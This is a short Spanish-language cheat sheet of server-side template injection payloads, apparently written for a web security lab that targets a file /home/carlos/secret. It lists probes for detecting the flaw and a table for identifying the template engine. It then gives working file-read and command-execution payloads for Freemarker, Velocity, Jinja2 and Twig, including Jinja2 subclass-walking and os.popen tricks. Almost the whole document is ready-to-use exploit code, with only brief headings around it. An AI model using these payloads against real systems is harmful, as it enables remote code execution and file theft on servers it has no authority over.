```javascript
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}

```

## Identificar el motor de plantillas
```javascript
${{<%[%'"}}%\.
```

### Según cómo responda el error, identificas el motor:

| Motor                 | Sintaxis básica |
| --------------------- | --------------- |
| **Freemarker** (Java) | `${...}`        |
| **Velocity** (Java)   | `#set()` `$...` |
| **Jinja2** (Python)   | `{{...}}`       |
| **Twig** (PHP)        | `{{...}}`       |
| **ERB** (Ruby)        | `<%= %>`        |
## Payloads para **leer archivos**

### **Freemarker (Java)**
```javascript
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /home/carlos/secret")}
```

## Velocity (Java)

```javascript
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("cat /home/carlos/secret"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### Jinja2 (Python) — leer archivo directo

```javascript
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Busca el índice de `<class 'subprocess.Popen'>` en la lista de arriba, luego:\

```javascript
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('cat /home/carlos/secret',shell=True,stdout=-1).communicate() }}
```

## Twig (PHP)

```javascript
{{ system('cat /home/carlos/secret') }}
```

o si `system` está bloqueado:

```javascript
{{ ['cat /home/carlos/secret']|filter('system') }}
```

## Payloads para **RCE genérico** (una vez que sabes el motor)

Freemarker — ejecutar comando arbitrario

```javascript
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

Jinja2 — RCE clásico sin necesidad de índice exacto

```javascript
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

